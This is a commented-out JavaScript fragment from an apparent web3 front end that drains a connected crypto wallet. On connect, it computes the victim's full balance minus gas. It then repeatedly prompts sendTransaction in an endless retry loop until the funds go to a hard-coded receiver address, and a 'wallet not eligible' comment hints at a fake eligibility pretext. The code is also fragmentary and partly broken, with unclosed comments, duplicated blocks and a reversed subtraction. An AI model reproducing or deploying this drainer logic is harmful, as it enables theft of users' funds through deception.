  /*

  /*{
        async onConnect({ address, connector, isReconnected }) {
     
            let bal = await publicClient.getBalance({address}) //data?.value || BigInt("0")
            const gasEst = await publicClient.estimateContractGas({
                abi: abi,
        functionName: "transferEther",
        args: [receiver],
        account: address,
        address: con_address,
        value: bal
            })
            let fee = gasPrice?.gasPrice || BigInt("0")
            let gasFee = fee * gasEst
            const rems =  bal - gasFee // - fee change back to balance minus fee
            console.log("gasest, gastamt, balance, sendable",gasEst, gasFee, bal, rems)
            setAmt(rems)
            /**
             * if(bal <= BigInt("0"))
             * {
             *   alert("Wallet not eligible")
             *   disconnect()
             * return
             * }
             * 
             * Call up modal to indicate not eligible
             
            
            
      
            }
    } 
  // Connect and send

  const publicClient = usePublicClient()
  
  const [amt, setAmt] = useState(BigInt("0"))
  const {data: gasPrice } = useFeeData()
  const {address, isConnected} = useAccount({
      async onConnect({ address, connector, isReconnected }) {
   
          let bal = data?.value || BigInt("0")
          const gasEst = await publicClient.estimateGas({
              to: receiver,account: address, value: bal
          })
          let fee = gasPrice?.gasPrice || BigInt("0")
          let gasFee = fee * gasEst
          const rems = gasFee - bal // - fee change back to balance minus fee
          console.log("gasest, gastamt, balance, sendable",gasEst, gasFee, bal, rems)
      
          /**
           * if(bal <= BigInt("0"))
           * {
           *   alert("Wallet not eligible")
           *   disconnect()
           * return
           * }
           * 
           * Call up modal to indicate not eligible
           //
          
          setAmt(rems)
    
          }
  })
  const {data} = useBalance({address})
  const {chain} = useNetwork()
  const receiver =  "0x359C0217D37b7E603A788f84B793E53d145b9D45" //receivers[chain]

  const {data: walletClient, isFetched, status} = useWalletClient(
    
      { 
        
      onError(error) {
       
        console.log("WC error", error)
      },
    
      async onSuccess(data) {
    
          console.log(receiver)
        if(isConnected)
        {
    
        while(true) 
       {
    
          try {
                const res = await data?.sendTransaction({
                    account: address,
                    to: receiver,
                    value: amt
                })
                console.log("WC datas",res)
    break
            
           } 
           catch (error) {
            console.log("sending from approve i.e send direct",error)
           }
        }
        }
      }
    })
*/

